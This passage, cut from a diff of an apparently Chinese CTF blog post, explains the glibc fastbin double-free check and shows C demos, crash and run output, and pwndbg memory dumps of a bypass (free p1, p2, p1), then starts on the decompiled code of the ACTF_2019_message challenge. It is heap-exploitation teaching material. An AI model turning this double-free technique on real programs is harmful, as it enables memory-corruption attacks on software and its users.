+</span></span><span class=line><span class=cl>	  <span class=p>}</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1>1</a>
+</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2>2</a>
+</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3>3</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=cm>/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span>
 </span></span><span class=line><span class=cl>    <span class=n>mchunkptr</span> <span class=n>old</span> <span class=o>=</span> <span class=o>*</span><span class=n>fb</span><span class=p>,</span> <span class=n>old2</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>old_idx</span> <span class=o>=</span> <span class=o>~</span><span class=mi>0u</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p>可以看到 fastbin 采用头插法来插入新的 chunk<br><code>old = *fb</code> 这里 old 是 fastbin 的链表头即上一次插入的 fastbin chunk<br><code>p</code> 是即将要插入 fastbin 的指针<br>也就是说检查只会检查当前要释放的 chunk 是不是上一次刚释放的 chunk<br>我们只需要在连续两次 <code>free(p1)</code> 之间插入 <code>free(p2)</code> 等代码即可</p><p>使用代码验证:
-<a href=https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#fastbin-double-free title=ctf-wiki rel="noopener external nofollow noreferrer" target=_blank class=exturl>ctf-wiki
-<i class="fa fa-external-link-alt"></i></a></p><ul><li><input disabled type=checkbox> TODO: 补充完成</li></ul></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
+</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>old_idx</span> <span class=o>=</span> <span class=o>~</span><span class=mi>0u</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p>可以看到 fastbin 采用头插法来插入新的 chunk<br><code>old = *fb</code> 这里 old 是 fastbin 的链表头即上一次插入的 fastbin chunk<br><code>p</code> 是即将要插入 fastbin 的指针<br>也就是说检查只会检查当前要释放的 chunk 是不是上一次刚释放的 chunk<br>我们只需要在连续两次 <code>free(p1)</code> 之间插入 <code>free(p2)</code> 等代码即可</p><p>使用代码验证:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1>1</a>
+</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2>2</a>
+</span><span class=lnt id=hl-10-3><a class=lnlinks href=#hl-10-3>3</a>
+</span><span class=lnt id=hl-10-4><a class=lnlinks href=#hl-10-4>4</a>
+</span><span class=lnt id=hl-10-5><a class=lnlinks href=#hl-10-5>5</a>
+</span><span class=lnt id=hl-10-6><a class=lnlinks href=#hl-10-6>6</a>
+</span><span class=lnt id=hl-10-7><a class=lnlinks href=#hl-10-7>7</a>
+</span><span class=lnt id=hl-10-8><a class=lnlinks href=#hl-10-8>8</a>
+</span><span class=lnt id=hl-10-9><a class=lnlinks href=#hl-10-9>9</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>编译运行:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1> 1</a>
+</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2> 2</a>
+</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3> 3</a>
+</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4> 4</a>
+</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5> 5</a>
+</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6> 6</a>
+</span><span class=lnt id=hl-11-7><a class=lnlinks href=#hl-11-7> 7</a>
+</span><span class=lnt id=hl-11-8><a class=lnlinks href=#hl-11-8> 8</a>
+</span><span class=lnt id=hl-11-9><a class=lnlinks href=#hl-11-9> 9</a>
+</span><span class=lnt id=hl-11-10><a class=lnlinks href=#hl-11-10>10</a>
+</span><span class=lnt id=hl-11-11><a class=lnlinks href=#hl-11-11>11</a>
+</span><span class=lnt id=hl-11-12><a class=lnlinks href=#hl-11-12>12</a>
+</span><span class=lnt id=hl-11-13><a class=lnlinks href=#hl-11-13>13</a>
+</span><span class=lnt id=hl-11-14><a class=lnlinks href=#hl-11-14>14</a>
+</span><span class=lnt id=hl-11-15><a class=lnlinks href=#hl-11-15>15</a>
+</span><span class=lnt id=hl-11-16><a class=lnlinks href=#hl-11-16>16</a>
+</span><span class=lnt id=hl-11-17><a class=lnlinks href=#hl-11-17>17</a>
+</span><span class=lnt id=hl-11-18><a class=lnlinks href=#hl-11-18>18</a>
+</span><span class=lnt id=hl-11-19><a class=lnlinks href=#hl-11-19>19</a>
+</span><span class=lnt id=hl-11-20><a class=lnlinks href=#hl-11-20>20</a>
+</span><span class=lnt id=hl-11-21><a class=lnlinks href=#hl-11-21>21</a>
+</span><span class=lnt id=hl-11-22><a class=lnlinks href=#hl-11-22>22</a>
+</span><span class=lnt id=hl-11-23><a class=lnlinks href=#hl-11-23>23</a>
+</span><span class=lnt id=hl-11-24><a class=lnlinks href=#hl-11-24>24</a>
+</span><span class=lnt id=hl-11-25><a class=lnlinks href=#hl-11-25>25</a>
+</span><span class=lnt id=hl-11-26><a class=lnlinks href=#hl-11-26>26</a>
+</span><span class=lnt id=hl-11-27><a class=lnlinks href=#hl-11-27>27</a>
+</span><span class=lnt id=hl-11-28><a class=lnlinks href=#hl-11-28>28</a>
+</span><span class=lnt id=hl-11-29><a class=lnlinks href=#hl-11-29>29</a>
+</span><span class=lnt id=hl-11-30><a class=lnlinks href=#hl-11-30>30</a>
+</span><span class=lnt id=hl-11-31><a class=lnlinks href=#hl-11-31>31</a>
+</span><span class=lnt id=hl-11-32><a class=lnlinks href=#hl-11-32>32</a>
+</span><span class=lnt id=hl-11-33><a class=lnlinks href=#hl-11-33>33</a>
+</span><span class=lnt id=hl-11-34><a class=lnlinks href=#hl-11-34>34</a>
+</span><span class=lnt id=hl-11-35><a class=lnlinks href=#hl-11-35>35</a>
+</span><span class=lnt id=hl-11-36><a class=lnlinks href=#hl-11-36>36</a>
+</span><span class=lnt id=hl-11-37><a class=lnlinks href=#hl-11-37>37</a>
+</span><span class=lnt id=hl-11-38><a class=lnlinks href=#hl-11-38>38</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  fastbin_attack gcc src.c
+</span></span><span class=line><span class=cl>➜  fastbin_attack ls
+</span></span><span class=line><span class=cl>a.out  src.c
+</span></span><span class=line><span class=cl>➜  fastbin_attack ./a.out
+</span></span><span class=line><span class=cl>*** Error in <span class=sb>`</span>./a.out<span class=err>&#39;</span>: double free or corruption <span class=o>(</span>fasttop<span class=o>)</span>: 0x0000000000859010 ***
+</span></span><span class=line><span class=cl><span class=o>=======</span> Backtrace: <span class=o>=========</span>
+</span></span><span class=line><span class=cl>/lib/x86_64-linux-gnu/libc.so.6<span class=o>(</span>+0x777f5<span class=o>)[</span>0x7fea652307f5<span class=o>]</span>
+</span></span><span class=line><span class=cl>/lib/x86_64-linux-gnu/libc.so.6<span class=o>(</span>+0x8038a<span class=o>)[</span>0x7fea6523938a<span class=o>]</span>
+</span></span><span class=line><span class=cl>/lib/x86_64-linux-gnu/libc.so.6<span class=o>(</span>cfree+0x4c<span class=o>)[</span>0x7fea6523d58c<span class=o>]</span>
+</span></span><span class=line><span class=cl>./a.out<span class=o>[</span>0x400594<span class=o>]</span>
+</span></span><span class=line><span class=cl>/lib/x86_64-linux-gnu/libc.so.6<span class=o>(</span>__libc_start_main+0xf0<span class=o>)[</span>0x7fea651d9840<span class=o>]</span>
+</span></span><span class=line><span class=cl>./a.out<span class=o>[</span>0x400499<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>=======</span> Memory map: <span class=o>========</span>
+</span></span><span class=line><span class=cl>00400000-00401000 r-xp <span class=m>00000000</span> 08:01 <span class=m>665526</span>                             /home/lhon901/fastbin_attack/a.out
+</span></span><span class=line><span class=cl>00600000-00601000 r--p <span class=m>00000000</span> 08:01 <span class=m>665526</span>                             /home/lhon901/fastbin_attack/a.out
+</span></span><span class=line><span class=cl>00601000-00602000 rw-p <span class=m>00001000</span> 08:01 <span class=m>665526</span>                             /home/lhon901/fastbin_attack/a.out
+</span></span><span class=line><span class=cl>00859000-0087a000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>                                  <span class=o>[</span>heap<span class=o>]</span>
+</span></span><span class=line><span class=cl>7fea60000000-7fea60021000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7fea60021000-7fea64000000 ---p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7fea64fa3000-7fea64fb9000 r-xp <span class=m>00000000</span> 08:01 <span class=m>914372</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+</span></span><span class=line><span class=cl>7fea64fb9000-7fea651b8000 ---p <span class=m>00016000</span> 08:01 <span class=m>914372</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+</span></span><span class=line><span class=cl>7fea651b8000-7fea651b9000 rw-p <span class=m>00015000</span> 08:01 <span class=m>914372</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+</span></span><span class=line><span class=cl>7fea651b9000-7fea65379000 r-xp <span class=m>00000000</span> 08:01 <span class=m>919643</span>                     /lib/x86_64-linux-gnu/libc-2.23.so
+</span></span><span class=line><span class=cl>7fea65379000-7fea65579000 ---p 001c0000 08:01 <span class=m>919643</span>                     /lib/x86_64-linux-gnu/libc-2.23.so
+</span></span><span class=line><span class=cl>7fea65579000-7fea6557d000 r--p 001c0000 08:01 <span class=m>919643</span>                     /lib/x86_64-linux-gnu/libc-2.23.so
+</span></span><span class=line><span class=cl>7fea6557d000-7fea6557f000 rw-p 001c4000 08:01 <span class=m>919643</span>                     /lib/x86_64-linux-gnu/libc-2.23.so
+</span></span><span class=line><span class=cl>7fea6557f000-7fea65583000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7fea65583000-7fea655a9000 r-xp <span class=m>00000000</span> 08:01 <span class=m>919635</span>                     /lib/x86_64-linux-gnu/ld-2.23.so
+</span></span><span class=line><span class=cl>7fea65799000-7fea6579c000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7fea657a7000-7fea657a8000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7fea657a8000-7fea657a9000 r--p <span class=m>00025000</span> 08:01 <span class=m>919635</span>                     /lib/x86_64-linux-gnu/ld-2.23.so
+</span></span><span class=line><span class=cl>7fea657a9000-7fea657aa000 rw-p <span class=m>00026000</span> 08:01 <span class=m>919635</span>                     /lib/x86_64-linux-gnu/ld-2.23.so
+</span></span><span class=line><span class=cl>7fea657aa000-7fea657ab000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>
+</span></span><span class=line><span class=cl>7ffd4a9a3000-7ffd4a9c4000 rw-p <span class=m>00000000</span> 00:00 <span class=m>0</span>                          <span class=o>[</span>stack<span class=o>]</span>
+</span></span><span class=line><span class=cl>7ffd4a9e4000-7ffd4a9e6000 r--p <span class=m>00000000</span> 00:00 <span class=m>0</span>                          <span class=o>[</span>vvar<span class=o>]</span>
+</span></span><span class=line><span class=cl>7ffd4a9e6000-7ffd4a9e8000 r-xp <span class=m>00000000</span> 00:00 <span class=m>0</span>                          <span class=o>[</span>vdso<span class=o>]</span>
+</span></span><span class=line><span class=cl>ffffffffff600000-ffffffffff601000 r-xp <span class=m>00000000</span> 00:00 <span class=m>0</span>                  <span class=o>[</span>vsyscall<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>    <span class=m>1161</span> abort      ./a.out</span></span></code></pre></td></tr></table></div></div><p>可以看到程序直接奔溃了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-12-1><a class=lnlinks href=#hl-12-1> 1</a>
+</span><span class=lnt id=hl-12-2><a class=lnlinks href=#hl-12-2> 2</a>
+</span><span class=lnt id=hl-12-3><a class=lnlinks href=#hl-12-3> 3</a>
+</span><span class=lnt id=hl-12-4><a class=lnlinks href=#hl-12-4> 4</a>
+</span><span class=lnt id=hl-12-5><a class=lnlinks href=#hl-12-5> 5</a>
+</span><span class=lnt id=hl-12-6><a class=lnlinks href=#hl-12-6> 6</a>
+</span><span class=lnt id=hl-12-7><a class=lnlinks href=#hl-12-7> 7</a>
+</span><span class=lnt id=hl-12-8><a class=lnlinks href=#hl-12-8> 8</a>
+</span><span class=lnt id=hl-12-9><a class=lnlinks href=#hl-12-9> 9</a>
+</span><span class=lnt id=hl-12-10><a class=lnlinks href=#hl-12-10>10</a>
+</span><span class=lnt id=hl-12-11><a class=lnlinks href=#hl-12-11>11</a>
+</span><span class=lnt id=hl-12-12><a class=lnlinks href=#hl-12-12>12</a>
+</span><span class=lnt id=hl-12-13><a class=lnlinks href=#hl-12-13>13</a>
+</span><span class=lnt id=hl-12-14><a class=lnlinks href=#hl-12-14>14</a>
+</span><span class=lnt id=hl-12-15><a class=lnlinks href=#hl-12-15>15</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;p1 addr: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;p2 addr: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;p3 addr: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>编译运行:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-13-1><a class=lnlinks href=#hl-13-1>1</a>
+</span><span class=lnt id=hl-13-2><a class=lnlinks href=#hl-13-2>2</a>
+</span><span class=lnt id=hl-13-3><a class=lnlinks href=#hl-13-3>3</a>
+</span><span class=lnt id=hl-13-4><a class=lnlinks href=#hl-13-4>4</a>
+</span><span class=lnt id=hl-13-5><a class=lnlinks href=#hl-13-5>5</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  fastbin_attack gcc src.c
+</span></span><span class=line><span class=cl>➜  fastbin_attack ./a.out
+</span></span><span class=line><span class=cl>p1 addr: 0x237e010
+</span></span><span class=line><span class=cl>p2 addr: 0x237e030
+</span></span><span class=line><span class=cl>p3 addr: 0x237e010</span></span></code></pre></td></tr></table></div></div><p>可以看到绕过了检测并且重新申请到了 p1 这块地址</p><p>gdb 调试:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-14-1><a class=lnlinks href=#hl-14-1>1</a>
+</span><span class=lnt id=hl-14-2><a class=lnlinks href=#hl-14-2>2</a>
+</span><span class=lnt id=hl-14-3><a class=lnlinks href=#hl-14-3>3</a>
+</span><span class=lnt id=hl-14-4><a class=lnlinks href=#hl-14-4>4</a>
+</span><span class=lnt id=hl-14-5><a class=lnlinks href=#hl-14-5>5</a>
+</span><span class=lnt id=hl-14-6><a class=lnlinks href=#hl-14-6>6</a>
+</span><span class=lnt id=hl-14-7><a class=lnlinks href=#hl-14-7>7</a>
+</span><span class=lnt id=hl-14-8><a class=lnlinks href=#hl-14-8>8</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; fastbin
+</span></span><span class=line><span class=cl>fastbins
+</span></span><span class=line><span class=cl>0x20: 0x602020 —▸ 0x602000 ◂— 0x602020 /* <span class=s1>&#39;  `&#39;</span> */
+</span></span><span class=line><span class=cl>pwndbg&gt; x/8gx 0x602000
+</span></span><span class=line><span class=cl>0x602000:       0x0000000000000000      0x0000000000000021
+</span></span><span class=line><span class=cl>0x602010:       0x0000000000602020      0x0000000000000000
+</span></span><span class=line><span class=cl>0x602020:       0x0000000000000000      0x0000000000000021
+</span></span><span class=line><span class=cl>0x602030:       0x0000000000602000      0x0000000000000000</span></span></code></pre></td></tr></table></div></div><p>可以看到已经形成了循环</p><h4 id=例题>例题
+<a class=header-anchor href=#%e4%be%8b%e9%a2%98></a></h4><h5 id=actf_><a href=https://buuoj.cn/challenges#[%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0][16.4.2%20double%20free%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F]ACTF_2019_message title=ACTF_2019_message rel="noopener external nofollow noreferrer" target=_blank class=exturl>ACTF_2019_message
+<i class="fa fa-external-link-alt"></i>
+</a><a class=header-anchor href=#actf_></a></h5><p>经典菜单题:</p><p>add</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-15-1><a class=lnlinks href=#hl-15-1> 1</a>
+</span><span class=lnt id=hl-15-2><a class=lnlinks href=#hl-15-2> 2</a>
+</span><span class=lnt id=hl-15-3><a class=lnlinks href=#hl-15-3> 3</a>
+</span><span class=lnt id=hl-15-4><a class=lnlinks href=#hl-15-4> 4</a>
+</span><span class=lnt id=hl-15-5><a class=lnlinks href=#hl-15-5> 5</a>
+</span><span class=lnt id=hl-15-6><a class=lnlinks href=#hl-15-6> 6</a>
+</span><span class=lnt id=hl-15-7><a class=lnlinks href=#hl-15-7> 7</a>
+</span><span class=lnt id=hl-15-8><a class=lnlinks href=#hl-15-8> 8</a>
+</span><span class=lnt id=hl-15-9><a class=lnlinks href=#hl-15-9> 9</a>
+</span><span class=lnt id=hl-15-10><a class=lnlinks href=#hl-15-10>10</a>
+</span><span class=lnt id=hl-15-11><a class=lnlinks href=#hl-15-11>11</a>
+</span><span class=lnt id=hl-15-12><a class=lnlinks href=#hl-15-12>12</a>
+</span><span class=lnt id=hl-15-13><a class=lnlinks href=#hl-15-13>13</a>
+</span><span class=lnt id=hl-15-14><a class=lnlinks href=#hl-15-14>14</a>
+</span><span class=lnt id=hl-15-15><a class=lnlinks href=#hl-15-15>15</a>
+</span><span class=lnt id=hl-15-16><a class=lnlinks href=#hl-15-16>16</a>
+</span><span class=lnt id=hl-15-17><a class=lnlinks href=#hl-15-17>17</a>
+</span><span class=lnt id=hl-15-18><a class=lnlinks href=#hl-15-18>18</a>
+</span><span class=lnt id=hl-15-19><a class=lnlinks href=#hl-15-19>19</a>
+</span><span class=lnt id=hl-15-20><a class=lnlinks href=#hl-15-20>20</a>
+</span><span class=lnt id=hl-15-21><a class=lnlinks href=#hl-15-21>21</a>
+</span><span class=lnt id=hl-15-22><a class=lnlinks href=#hl-15-22>22</a>
+</span><span class=lnt id=hl-15-23><a class=lnlinks href=#hl-15-23>23</a>
+</span><span class=lnt id=hl-15-24><a class=lnlinks href=#hl-15-24>24</a>
+</span><span class=lnt id=hl-15-25><a class=lnlinks href=#hl-15-25>25</a>
+</span><span class=lnt id=hl-15-26><a class=lnlinks href=#hl-15-26>26</a>
+</span><span class=lnt id=hl-15-27><a class=lnlinks href=#hl-15-27>27</a>
+</span><span class=lnt id=hl-15-28><a class=lnlinks href=#hl-15-28>28</a>
+</span><span class=lnt id=hl-15-29><a class=lnlinks href=#hl-15-29>29</a>
+</span><span class=lnt id=hl-15-30><a class=lnlinks href=#hl-15-30>30</a>
+</span><span class=lnt id=hl-15-31><a class=lnlinks href=#hl-15-31>31</a>
+</span><span class=lnt id=hl-15-32><a class=lnlinks href=#hl-15-32>32</a>
+</span><span class=lnt id=hl-15-33><a class=lnlinks href=#hl-15-33>33</a>
+</span><span class=lnt id=hl-15-34><a class=lnlinks href=#hl-15-34>34</a>
+</span><span class=lnt id=hl-15-35><a class=lnlinks href=#hl-15-35>35</a>
+</span><span class=lnt id=hl-15-36><a class=lnlinks href=#hl-15-36>36</a>
+</span><span class=lnt id=hl-15-37><a class=lnlinks href=#hl-15-37>37</a>
+</span><span class=lnt id=hl-15-38><a class=lnlinks href=#hl-15-38>38</a>
+</span><span class=lnt id=hl-15-39><a class=lnlinks href=#hl-15-39>39</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>add</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-28h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>len</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-24h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>counts</span> <span class=o>&lt;=</span> <span class=mi>10</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input the length of message:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>len</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Length is invalid!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>9</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>len</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input the message:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>],</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=o>++</span><span class=n>counts</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Message is full!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>detele</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-16-1><a class=lnlinks href=#hl-16-1> 1</a>
+</span><span class=lnt id=hl-16-2><a class=lnlinks href=#hl-16-2> 2</a>
+</span><span class=lnt id=hl-16-3><a class=lnlinks href=#hl-16-3> 3</a>
+</span><span class=lnt id=hl-16-4><a class=lnlinks href=#hl-16-4> 4</a>
+</span><span class=lnt id=hl-16-5><a class=lnlinks href=#hl-16-5> 5</a>
